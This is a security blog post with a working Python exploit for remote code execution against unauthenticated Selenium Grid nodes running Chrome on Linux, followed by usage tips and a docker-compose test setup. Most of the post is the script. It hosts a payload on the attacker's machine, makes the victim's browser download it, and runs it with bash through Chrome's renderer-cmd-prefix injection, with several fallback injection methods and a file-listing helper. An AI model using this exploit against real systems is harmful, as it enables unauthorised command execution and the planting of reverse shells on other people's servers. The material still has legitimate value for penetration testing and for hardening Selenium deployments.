<!DOCTYPE html>
<html lang="en">

    <head><title>Selenium Grid RCE - Chrome on Linux &ndash; infosec blog</title>
<meta name="description" content="Thoughts and notes on security topics">

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="utf-8"/>



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin="anonymous" />


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />


<link rel="stylesheet" href="https://evillogic.github.io/css/colour/wooper.css">
<link rel="stylesheet" href="https://evillogic.github.io/css/colour/wooper-mode.css">
<link rel="stylesheet" href="https://evillogic.github.io/css/risotto.css">
<link rel="stylesheet" href="https://evillogic.github.io/css/custom.css">
</head>

    <body>
        <div class="page">

            <header class="page__header"><h1 class="page__logo"><a href="https://evillogic.github.io" class="page__logo-inner">infosec blog</a></h1>
<nav class="page__nav main-nav">
    <ul>
    
    
    <li class="main-nav__item"><a class="nav-main-item" href="/about/" title="">About</a></li>
    
    <li class="main-nav__item"><a class="nav-main-item" href="/notes/" title="Notes">Notes</a></li>
    
    <li class="main-nav__item"><a class="nav-main-item active" href="/posts/" title="Posts">Posts</a></li>
    
    </ul>
</nav>

</header>

            <section class="page__body">
    <header class="content__header">
        <h1>Selenium Grid RCE - Chrome on Linux</h1>
    </header>
    <div class="content__body">
        <p>Selenium is an awesome tool that you can use to completely drive a web browser through a nice and simple python interface. There&rsquo;s lots of cool possibilities to use this for red teaming, however the simplest is that it can provide a trivial vector for RCE when unauthenticated.</p>
<p>There are several publicly available exploits for Selenium Grid, however during testing I found that most of them were either low quality or do not work on unix environments due to the executable filesystem permission. Let&rsquo;s skip to the good part:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socketserver
<span style="color:#f92672">import</span> threading
<span style="color:#f92672">import</span> time
<span style="color:#f92672">import</span> argparse
<span style="color:#f92672">import</span> posixpath
<span style="color:#f92672">import</span> urllib
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> signal
<span style="color:#f92672">from</span> selenium <span style="color:#f92672">import</span> webdriver
<span style="color:#f92672">from</span> selenium.webdriver.common.keys <span style="color:#f92672">import</span> Keys
<span style="color:#f92672">from</span> selenium.webdriver.common.desired_capabilities <span style="color:#f92672">import</span> DesiredCapabilities
<span style="color:#f92672">from</span> selenium.webdriver.chrome.options <span style="color:#f92672">import</span> Options
<span style="color:#f92672">from</span> http.server <span style="color:#f92672">import</span> HTTPServer, BaseHTTPRequestHandler

<span style="color:#75715e"># parsers</span>
parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-u&#34;</span>, <span style="color:#e6db74">&#34;--url&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
   help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IP Selenium is running on&#34;</span>)
parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-p&#34;</span>, <span style="color:#e6db74">&#34;--port&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
   help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Port selenium is running on&#34;</span>)
parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-e&#34;</span>, <span style="color:#e6db74">&#34;--exploit&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
   help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Path to exploit&#34;</span>)
parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-w&#34;</span>, <span style="color:#e6db74">&#34;--web&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
   help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IP of machine hosting exploit (Should be attackers machine)&#34;</span>)
args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()


<span style="color:#75715e"># attacker info</span>
payload_name <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>exploit
attack_url <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>web
attack_full <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>attack_url<span style="color:#e6db74">}</span><span style="color:#e6db74">:8000/</span><span style="color:#e6db74">{</span>payload_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
attack_dl <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>attack_url<span style="color:#e6db74">}</span><span style="color:#e6db74">:8000/download&#34;</span>

<span style="color:#75715e"># victim info</span>
vic_url <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>url
vic_port <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>port
vic_full <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>vic_url<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>vic_port<span style="color:#e6db74">}</span><span style="color:#e6db74">/wd/hub&#34;</span>

<span style="color:#75715e"># download path (Where chrome downloads the binary. needs to be writeable)</span>
download_dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp&#34;</span>
full_exploit <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>download_dir<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>payload_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
download <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&lt;a href=&#39;</span><span style="color:#e6db74">{</span>attack_full<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; id=&#39;raw-url&#39;&gt;Download&lt;/a&gt;&#34;</span>

driver <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">alarm_handler</span>(signum, frame):
    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Time!&#34;</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_timer</span>(seconds):
    signal<span style="color:#f92672">.</span>signal(signal<span style="color:#f92672">.</span>SIGALRM, alarm_handler)
    signal<span style="color:#f92672">.</span>alarm(seconds)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">convert</span>(driver, element_to_check_for_dict):
    <span style="color:#66d9ef">if</span> type(element_to_check_for_dict) <span style="color:#f92672">is</span> dict:
        first_element_value <span style="color:#f92672">=</span> list(element_to_check_for_dict<span style="color:#f92672">.</span>values())[<span style="color:#ae81ff">0</span>]
        element_to_check_for_dict <span style="color:#f92672">=</span> driver<span style="color:#f92672">.</span>create_web_element(element_id<span style="color:#f92672">=</span>first_element_value)
    <span style="color:#66d9ef">return</span> element_to_check_for_dict

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">S</span>(BaseHTTPRequestHandler):
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_set_headers</span>(self):
        self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
        self<span style="color:#f92672">.</span>send_header(<span style="color:#e6db74">&#34;Content-type&#34;</span>, <span style="color:#e6db74">&#34;text/html&#34;</span>)
        self<span style="color:#f92672">.</span>end_headers()

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_set_headers_b</span>(self):
        self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
        self<span style="color:#f92672">.</span>send_header(<span style="color:#e6db74">&#34;Content-type&#34;</span>, <span style="color:#e6db74">&#34;binary/octet-stream&#34;</span>)
        self<span style="color:#f92672">.</span>end_headers()

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_html</span>(self, message):
        <span style="color:#e6db74">&#34;&#34;&#34;This just generates an HTML document that includes `message`
</span><span style="color:#e6db74">        in the body. Override, or re-write this do do more interesting stuff.
</span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
        content <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&lt;html&gt;&lt;body&gt;&lt;h1&gt;</span><span style="color:#e6db74">{</span>message<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span>
        <span style="color:#66d9ef">return</span> content<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf8&#34;</span>)  <span style="color:#75715e"># NOTE: must return a bytes object!</span>

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_GET</span>(self):
        
        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/download&#39;</span>:
            self<span style="color:#f92672">.</span>_set_headers()
            self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(self<span style="color:#f92672">.</span>_html(download))
        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>path <span style="color:#f92672">==</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/</span><span style="color:#e6db74">{</span>payload_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>:
            self<span style="color:#f92672">.</span>_set_headers_b()
            <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>exploit, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> file: 
                self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(file<span style="color:#f92672">.</span>read()) <span style="color:#75715e"># Read the file and send the contents </span>

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_HEAD</span>(self):
        self<span style="color:#f92672">.</span>_set_headers()

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_POST</span>(self):
        <span style="color:#75715e"># Doesn&#39;t do anything with posted data</span>
        self<span style="color:#f92672">.</span>_set_headers()
        self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(self<span style="color:#f92672">.</span>_html(<span style="color:#e6db74">&#34;POST!&#34;</span>))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(server_class<span style="color:#f92672">=</span>HTTPServer, handler_class<span style="color:#f92672">=</span>S, addr<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">8000</span>):
    server_address <span style="color:#f92672">=</span> (addr, port)
    httpd <span style="color:#f92672">=</span> server_class(server_address, handler_class)

    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Starting httpd server on </span><span style="color:#e6db74">{</span>addr<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
    httpd<span style="color:#f92672">.</span>serve_forever()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_web_background</span>():
    run()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">thread_it</span>():
    <span style="color:#75715e"># do some stuff</span>
    download_thread <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>run_web_background)
    download_thread<span style="color:#f92672">.</span>start()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">selenium_dl_payload</span>():
    <span style="color:#75715e"># Phase 1 download reverse shell</span>
    chrome_options <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>ChromeOptions()
    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--no-sandbox&#34;</span>)
    preferences <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;download.default_directory&#34;</span>: download_dir ,
               	<span style="color:#e6db74">&#34;directory_upgrade&#34;</span>: <span style="color:#66d9ef">True</span>,
               	<span style="color:#e6db74">&#34;safebrowsing.enabled&#34;</span>: <span style="color:#66d9ef">True</span> }
    chrome_options<span style="color:#f92672">.</span>add_experimental_option(<span style="color:#e6db74">&#34;prefs&#34;</span>, preferences)
    driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Remote(command_executor<span style="color:#f92672">=</span>vic_full, options<span style="color:#f92672">=</span>chrome_options)
    <span style="color:#75715e"># Selenium flow</span>
    driver<span style="color:#f92672">.</span>get(attack_dl)
    print(<span style="color:#e6db74">&#34;GET request, waiting for page load&#34;</span>)
    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">10</span>)
    print(driver<span style="color:#f92672">.</span>page_source)
    dl <span style="color:#f92672">=</span> driver<span style="color:#f92672">.</span>find_element(<span style="color:#e6db74">&#34;id&#34;</span>, <span style="color:#e6db74">&#34;raw-url&#34;</span>)
    dl <span style="color:#f92672">=</span> convert(driver, dl)
    dl<span style="color:#f92672">.</span>click()
    print(<span style="color:#e6db74">&#34;clicked, waiting 10 seconds for download&#34;</span>)
    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">10</span>)
    print(<span style="color:#e6db74">&#34;download should be finished&#34;</span>)
    driver<span style="color:#f92672">.</span>quit()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_list</span>(directory):
    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;listing </span><span style="color:#e6db74">{</span>directory<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
    driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Remote(command_executor<span style="color:#f92672">=</span>vic_full, desired_capabilities<span style="color:#f92672">=</span>DesiredCapabilities<span style="color:#f92672">.</span>CHROME)
    driver<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;file://</span><span style="color:#e6db74">{</span>directory<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
    print(driver<span style="color:#f92672">.</span>page_source)
    driver<span style="color:#f92672">.</span>quit()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_source</span>(url):
    driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Remote(command_executor<span style="color:#f92672">=</span>vic_full, desired_capabilities<span style="color:#f92672">=</span>DesiredCapabilities<span style="color:#f92672">.</span>CHROME)
    driver<span style="color:#f92672">.</span>get(url)
    print(driver<span style="color:#f92672">.</span>page_source)
    driver<span style="color:#f92672">.</span>quit()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">binary_location_method</span>(command, args):
    <span style="color:#75715e"># This method attempts to use the binary_location method to perform command injection</span>
    print(<span style="color:#e6db74">&#39;executing...&#39;</span>)
    option <span style="color:#f92672">=</span> Options()
    option<span style="color:#f92672">.</span>binary_location <span style="color:#f92672">=</span> command
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> args:
        option<span style="color:#f92672">.</span>add_argument(i)
    driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Remote(command_executor<span style="color:#f92672">=</span>vic_full, options<span style="color:#f92672">=</span>option)
    driver<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://google.com/&#39;</span>)
    driver<span style="color:#f92672">.</span>quit()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">executable_method</span>(path):
    <span style="color:#75715e"># This method attempts to use the executable_path to start your binary directly</span>
    driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Remote(command_executor<span style="color:#f92672">=</span>vic_full, executable_path<span style="color:#f92672">=</span>path)
    driver<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;https://google.com/&#39;</span>)
    driver<span style="color:#f92672">.</span>quit()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">prefix_attack</span>(payload):
    <span style="color:#75715e"># This method attempts to use utility-cmd-prefix to perform command injection</span>
    chrome_options <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>ChromeOptions()
    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--no-sandbox&#34;</span>)
    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--utility-and-browser&#34;</span>)
    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--utility-cmd-prefix=&#34;</span><span style="color:#f92672">+</span>payload)
    driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Remote(command_executor<span style="color:#f92672">=</span>vic_full, desired_capabilities<span style="color:#f92672">=</span>DesiredCapabilities<span style="color:#f92672">.</span>CHROME, options<span style="color:#f92672">=</span>chrome_options)
    print(<span style="color:#e6db74">&#34;This will not be reached&#34;</span>)
    driver<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://google.com&#34;</span>)
    print(<span style="color:#e6db74">&#34;executed&#34;</span>)
    driver<span style="color:#f92672">.</span>quit()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">renderer_attack</span>(payload):
    <span style="color:#75715e"># This method attempts to use renderer-cmd-prefix to perform command injection</span>
    <span style="color:#75715e"># For some reason this is the most reliable method</span>
    chrome_options <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>ChromeOptions()
    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--no-sandbox&#34;</span>)
    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--renderer-cmd-prefix=&#34;</span><span style="color:#f92672">+</span>payload)
    driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Remote(command_executor<span style="color:#f92672">=</span>vic_full, desired_capabilities<span style="color:#f92672">=</span>DesiredCapabilities<span style="color:#f92672">.</span>CHROME, options<span style="color:#f92672">=</span>chrome_options)
    print(<span style="color:#e6db74">&#34;This will not be reached&#34;</span>)
    driver<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://google.com&#34;</span>)
    print(<span style="color:#e6db74">&#34;executed&#34;</span>)
    driver<span style="color:#f92672">.</span>quit()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
    <span style="color:#75715e"># Execute our payload</span>
    start_timer(<span style="color:#ae81ff">10</span>)
    <span style="color:#66d9ef">try</span>:
        renderer_attack(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;bash </span><span style="color:#e6db74">{</span>full_exploit<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
        <span style="color:#66d9ef">pass</span>
    print(<span style="color:#e6db74">&#34;Ding! Check your exploit :)&#34;</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
    thread_it()
    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
    print(<span style="color:#e6db74">&#34;starting download&#34;</span>)
    selenium_dl_payload()
    print(<span style="color:#e6db74">&#34;starting exploit&#34;</span>)
    exploit()

<span style="color:#75715e">#if __name__ == &#39;__main__&#39;:</span>
<span style="color:#75715e">#    main()</span>
</code></pre></div><h1 id="basic-rce-usage">Basic RCE Usage</h1>
<blockquote>
<p>python3 -i selenium-poc.py -u <target-url> -p <target-port> -w <your-address> -e <bash-exploit-script>
main()</p>
</blockquote>
<p>First of all, much of this script is stolen from a publicly available exploit by another author. This original script however did not work correctly when targetting linux hosts in practice, so I expanded upon it until it did. I have added in multiple methods that I attempted to use to get this exploit working on linux targets and defined the webdriver as a global, which is very important if anything goes wrong during exploitation. The addtional exploit methods should come in handy to anyone stuck in a similar situation in the future.</p>
<p>The webdriver being defined as a global is important because any time an exception is thrown by the local Selenium API wrapper you could lose the handle to the session. If you lose the handle to the session you generally have to wait several hours until your target automatically times out the session. If you attempt to start a new session during this time, it will simply get added to a queue, fortunately these tend to time out faster if the original client isn&rsquo;t still waiting to pick up its session. Running our exploit in the python interpreter and setting driver to be a global solves this problem, as we can always call driver.quit() to gracefully close the last session and try another attack.</p>
<p>Another consideration is that chrome will not overwrite previous downloads with the same name, which means that you will need to use a unique exploit name each time you download another script to the disk. If you do accidentally download the same file name twice, it will instead write your exploit to <code>&lt;filename&gt; (2)</code> If your script is too big and cannot complete the download within 10 seconds, you will see a crdownload file within the download directory.</p>
<h1 id="additional-capabilities">Additional capabilities</h1>
<p>You can call <code>get_list(&lt;path&gt;)</code> to list directories and read out files for read or debugging purposes. This is actually just a basic request to chrome file URI, but it comes in handy.</p>
<h1 id="my-test-setup">My test setup</h1>
<p>In my experience docker deployments of this app seem to be pretty common, which is unfortunate from an attacker&rsquo;s perspective but RCE is still RCE. It also makes it easy to deploy Selenium and test this out.</p>
<p>For my test instance, I have used this <a href="https://github.com/SeleniumHQ/docker-selenium/blob/trunk/docker-compose-v3.yml">docker-compose file</a> that starts up a few different nodes from the <a href="https://github.com/SeleniumHQ/docker-selenium">official docker-selenium repository</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#75715e"># To execute this docker-compose yml file use `docker-compose -f docker-compose-v3.yml up`</span>
<span style="color:#75715e"># Add the `-d` flag at the end for detached execution</span>
<span style="color:#75715e"># To stop the execution, hit Ctrl+C, and then `docker-compose -f docker-compose-v3.yml down`</span>
<span style="color:#f92672">version</span>: <span style="color:#e6db74">&#34;3&#34;</span>
<span style="color:#f92672">services</span>:
  <span style="color:#f92672">chrome</span>:
    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">selenium/node-chrome:4.4.0-20220831</span>
    <span style="color:#f92672">shm_size</span>: <span style="color:#ae81ff">2gb</span>
    <span style="color:#f92672">depends_on</span>:
      - <span style="color:#ae81ff">selenium-hub</span>
    <span style="color:#f92672">environment</span>:
      - <span style="color:#ae81ff">SE_EVENT_BUS_HOST=selenium-hub</span>
      - <span style="color:#ae81ff">SE_EVENT_BUS_PUBLISH_PORT=4442</span>
      - <span style="color:#ae81ff">SE_EVENT_BUS_SUBSCRIBE_PORT=4443</span>

  <span style="color:#f92672">edge</span>:
    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">selenium/node-edge:4.4.0-20220831</span>
    <span style="color:#f92672">shm_size</span>: <span style="color:#ae81ff">2gb</span>
    <span style="color:#f92672">depends_on</span>:
      - <span style="color:#ae81ff">selenium-hub</span>
    <span style="color:#f92672">environment</span>:
      - <span style="color:#ae81ff">SE_EVENT_BUS_HOST=selenium-hub</span>
      - <span style="color:#ae81ff">SE_EVENT_BUS_PUBLISH_PORT=4442</span>
      - <span style="color:#ae81ff">SE_EVENT_BUS_SUBSCRIBE_PORT=4443</span>

  <span style="color:#f92672">firefox</span>:
    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">selenium/node-firefox:4.4.0-20220831</span>
    <span style="color:#f92672">shm_size</span>: <span style="color:#ae81ff">2gb</span>
    <span style="color:#f92672">depends_on</span>:
      - <span style="color:#ae81ff">selenium-hub</span>
    <span style="color:#f92672">environment</span>:
      - <span style="color:#ae81ff">SE_EVENT_BUS_HOST=selenium-hub</span>
      - <span style="color:#ae81ff">SE_EVENT_BUS_PUBLISH_PORT=4442</span>
      - <span style="color:#ae81ff">SE_EVENT_BUS_SUBSCRIBE_PORT=4443</span>

  <span style="color:#f92672">selenium-hub</span>:
    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">selenium/hub:4.4.0-20220831</span>
    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">selenium-hub</span>
    <span style="color:#f92672">ports</span>:
      - <span style="color:#e6db74">&#34;4442:4442&#34;</span>
      - <span style="color:#e6db74">&#34;4443:4443&#34;</span>
      - <span style="color:#e6db74">&#34;4444:4444&#34;</span>
</code></pre></div>
    </div>
    <footer class="content__footer"></footer>

            </section>

            <section class="page__aside">
                <div class="aside__about">
<div class="aside__about">
    <img class="about__logo" src="https://evillogic.github.io/images/rice.svg" alt="Logo">
<h1 class="about__title">infosec blog</h1>
<p class="about__description">Thoughts and notes on security topics</p>
</div>


<ul class="aside__social-links">
    
    <li>
        <a href="https://github.com/evillogic" rel="me" aria-label="GitHub" title="GitHub"><i class="fab fa-github" aria-hidden="true"></i></a>&nbsp;
    </li>
    
    <li>
        <a href="mailto:evillogic1@gmail.com" rel="me" aria-label="Email" title="Email"><i class="fas fa-envelope" aria-hidden="true"></i></a>&nbsp;
    </li>
    
    <li>
        <a href="#ZgotmplZ" rel="me" aria-label="Happy Hacking!" title="Happy Hacking!"><i class="ai ai-arxiv" aria-hidden="true"></i></a>&nbsp;
    </li>
    
</ul>
</div>
                <hr>
                <div class="aside__content">
    
    
        <p>
            
            2022-09-12
        </p>
    

                </div>
            </section>

            <footer class="page__footer"><p class="copyright">© 2022 Kaz Bishop</p>
<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
<script defer language="javascript" type="text/javascript"  src="/js/copy.js"></script>
</footer>

        </div>
    </body>

</html>
